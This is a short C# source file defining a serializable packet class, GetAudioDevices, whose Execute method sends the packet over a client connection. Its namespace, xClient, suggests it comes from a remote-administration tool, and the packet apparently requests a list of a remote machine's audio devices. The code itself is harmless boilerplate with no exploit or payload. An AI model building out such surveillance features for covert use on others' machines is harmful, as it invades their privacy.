using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets {

    [Serializable]
    public class GetAudioDevices : IPacket {
        public GetAudioDevices() {
            
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
